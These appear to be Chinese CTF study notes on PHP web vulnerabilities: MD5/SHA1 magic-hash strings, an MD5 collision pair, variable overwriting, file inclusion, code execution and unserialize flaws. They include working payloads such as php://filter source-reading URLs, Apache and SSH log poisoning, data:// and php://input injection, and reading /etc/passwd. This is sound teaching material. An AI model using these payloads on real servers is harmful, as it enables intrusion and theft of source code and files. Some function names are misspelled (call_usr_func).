# Chapter 2 PHP
## 2.2 PHP 的弱类型特性
```php
<?php
if (md5($_GET['a']) == md5($_GET['b'])) {
	echo $flag;
}
```
如何获得 flag？
条件：
- 经过 md5 后，计算结果开头是 0e，让 PHP 误以为这段字符串是科学计数法。
- 0e后面全是数字。`0e123 == 0d234`。
满足以上两个条件的字符串如下：
```
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
```
经两次 md5 后的字符串也要了解：
```
bDLytmyGm2xQyaLNhWn
770hQgrBOjrcqftrlazk
7r4lGXCH2Ksu2JNT3BYM
```

MD4 符合两个条件的字符串：
```
0e251288019
```

SHA1 符合这两个条件的字符串：
```
aa3OFF9m
aaO8zKZF
aaroZmOk
aaK1STfY
```

`md5` 碰撞对
```
$a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2

$b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
```
## 2.3 PHP 变量覆盖漏洞
1) PHP动态设置变量语法
```php
<?php
$test = 'abc';
$$test = 'success';
var_dump($abc);
// Output: success
$test2 = 'cde';
${$test2} = 'success2';
var_dump($cde);
// Output: success2
```
动态设置变量。`{}` 代表优先解析。

2) PHP 函数 `extract()` `parse_str()` `mb_parse_str()`
`extract()` 用于将一个键值对数组的 key 变成变量名，value 变成变量值。
```php
<?php
extract(["test" => "a", "test2" => "b"]);
var_dump($test);
var_dump($test2);
```

`parse_str` 用于解析 `string` 中的 `"test=a&test2=b"` ，并且生成一个键值对数组，放到第二个参数中。并且会自动 URL 解码。
```php
<?php
parse_str("test=a&test2=b", $result);
print_r($result);
/*
Output:
Array
(
    [test] => a
    [test2] => b
)
*/
```
3) PHP 配置项 (`php.ini`)
修改 `register_globals = On` ，但不常见。可以把 GET/POST 参数注册成变量。
## 2.4 PHP 文件包含漏洞
`include`, `include_once`, `require`, `require_once`.
1) 有无 once，代表是否只包含一次
2) `include` 包含文件遇到一些错误，还会继续执行。但是 `require` 遇到错误后，程序不会继续往下执行。
文件包含可包含 `php` 文件，将会进行解析。如果包含的不是 `php` 文件（只要有代码，就解析），那么原样输出。
那么可以以两种方式利用。
- 上传恶意代码，使其被包含。
- 包含隐私文件，如 `/etc/passwd`。

### 本地包含
包含本地文件漏洞利用：
1) 上传恶意代码，执行之
2) 中间件日志投毒。创建记录，如`?file=<?php phpinfo()?>`，再进行包含，如 `/var/log/apache2/access.log`。
3) SSH 日志投毒。创建记录，`ssh '<?php phpinfo();?>'@HOST` 。进行包含，`/var/log/auth.log`。
### 远程包含
远程文件包含。
在 `/etc/php/7.0/apache2/php.ini` 中修改。`allow_url_include = On`。以 `Kali Linux` 为例。
1) HTTP 远程文件包含
2) FTP 远程文件包含
### 伪协议
#### 读你源码！！！
PHP伪协议读取文件：
##### `php://filter`
`php://filter/` 可以对读取到的文件内容进行一定的处理。
```
php://filter/read=convert.base64-encode/resource=api.php
```

`php://filter` 表示使用 PHP 过滤器。
`/read` 代表用什么过滤器。
`/resource` 后面跟上要过滤的文件。

通常用法：
```
http://url/?file=php://filter/read=convert.base64-encode/resource=api.php
```

```php
// 后台源码
<?php
include($_GET['file']);
// include(php://filter/read=convert.base64-encoded/resource=api.php);
?>
```

如果 Base64 被过滤了，可以使用 UTF-8 转 UTF-7 打乱 `php` 标签，取消解析，输出源码。
```
php://filter/convert.iconv.utf-8.utf-7/resource=index.php
```

还有一些过滤器，后面不总是 `/read=`。
```
php://filter/string.strip_tags/resource=index.php 
php://filter/string.toupper/resource=index.php
```
#### 让你解析！！！
##### `phar://` `zip://` 
压缩包解析：
```
phar:///tmp/zip.jpg/1.php
phar://
/tmp/zip.jpg
/1.php
```

```
zip:///tmp/zip.jpg#1.php
zip://
/tmp/zip.jpg
#1.php
```
#### 喂你数据！！！
接下来的两个协议都需要 `allow_url_include = On`。
##### `php://input` POST
`php://input` 包含 POST  数据。 `php://input` 是个输入流，应该看作一个文件。
在 `php.ini` 中设置 `url_allow_include = On` ，使得 `php://input` 能获取 POST 中的数据。
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("php://input");
```
不要用 HackBar。如果 POST 传参没有 `a=b` 这样的形式的话，它不会发送数据的。并且它还会进行 URL 编码。
##### `data://`
`data://` 传入数据，也可看作一个文件。

```php
<?php
$file='data://text/plain,<?php phpinfo();?>';
include($file);
```

```php
<?php
$file = "data://text/plain;base64,".base64_encode("<?php phpinfo();?>");
include($file);
```
## 2.5 PHP 代码执行漏洞
### `eval()`
将字符串当作 PHP 代码执行。要加分号。
```php
eval("phpinfo();");
```
### `assert()`
也可执行 PHP 代码，不可加分号。但是 8.0.0 之后完全移除。
```php
assert("phpinfo()");
```

### `call_usr_func()`
参照类：
```php
class MyClass {
	static function method1() {
		echo "Here is method1() in MyClass\n";
	}
}
```
只有加上 `static` 后才可调用。（来自 PHP 8.0 版本）

可以直接调用自己的函数，输入函数名（string），但是不用加括号。
```php
call_usr_func("fun");
```

也可输入一个数组，前面是对象名或类名，后面是类中的方法。
```php
call_usr_func(["MyClass", "method1"]);
```

如果要将 URL 的 GET 参数当作数组来输入，那么传参要这样：
```php
// ?req[]=MyClass&req[]=method1
call_usr_func($_GET['req']);
```

好像传参对大小写不敏感？？？
### `create_function()`
创建一个函数。有两个参数，都是字符串。第一个字符串为参数列表，第二个字符串为函数的代码。然后将会返回一个独特的函数名。
但是 PHP 8.0 已经完全去除。

常规用法：
```php
$name = create_function('$a', 'return $a + 1;');
echo $name(4);
```

骚操作：
```php
create_function('', 'phpinfo();')();
```
创建完后立马调用。
### `array_map()` `array_walk()` `array_filter()`
这里简单介绍一下 `array_map()`。
它将会对数组中的每个值调用函数。
```php
<?php
array_map('phpinfo', [1]);
// 相当于 phpinfo(1)
```
### `$_GET['method']()`
```php
<?php
include('class.php');
print_r($_GET['method']);
$_GET['method']();
```

![[Pasted image 20241101170220.png]]

这也行？？？
不过都到这步了，不直接 `?method=phpinfo` ？
### 总结
关键是怎么创造代码执行。
如果是 PHP 代码，那么就创造分号闭合，再输入自己的代码。
单引号内不会解析变量，双引号内会解析变量。
记住调用函数的技巧。
## 2.6 PHP 反序列化漏洞
序列化(`serialize()`)，将对象变成一个字符串。注意字符串里面可能有特殊字符，直接输出到 shell 的话，可能会发生偏差，不能将 shell 上显示出的字符串用来。
反序列化(`unserialize()`)，从字符串中提取信息，生成一个新的对象。

魔术方法：
- `__construct()` 在对象初始化的时候调用
- `__destruct()` 在对象被销毁的时候调用
- `__wakeup()` 在反序列化对象的时候调用
- `__sleep()` 在开始序列化的时候调用

漏洞原理：
反序列化时会创建一个对象。如果我们能本地构建一个对象，并反序列化，到时候传到目标服务器上时，就能进行一些操作。

漏洞利用：
- 直接控制 `unserialize()` 函数的参数，随心所欲创建对象。
- 通过文件操作函数来进行反序列化操作。未复现：在压缩文件中存储一个对象，当这个压缩文件被 PHP 读取时，就会反序列化这个对象。